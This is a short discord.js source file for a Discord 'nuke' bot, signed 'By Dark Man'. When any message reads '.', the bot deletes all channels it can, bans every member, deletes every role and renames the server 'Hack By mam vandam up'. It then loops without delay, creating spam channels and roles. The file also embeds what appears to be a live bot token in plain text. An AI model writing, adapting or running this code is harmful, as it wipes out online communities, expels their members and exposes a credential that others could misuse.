const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ""; 
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete(".");
        }
      });
      message.guild.members.forEach(m => {
        m.ban(".");
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("Hack By mam vandam up");
      setInterval(function() {
        message.guild.createChannel("By harki ", "voice");
        message.guild.createChannel("By taman", "text");
        message.guild.createRole({ name: "By taman manu brakany up @everyone " });
      });
    }
  }
});

client.login("ODIxMDU5NjExNzY3MjEwMDI0.YE-NWQ.djoug0DnwpvQFQ-gTuSwAMYvjlw");
///////By Dark Man\\\\\\\
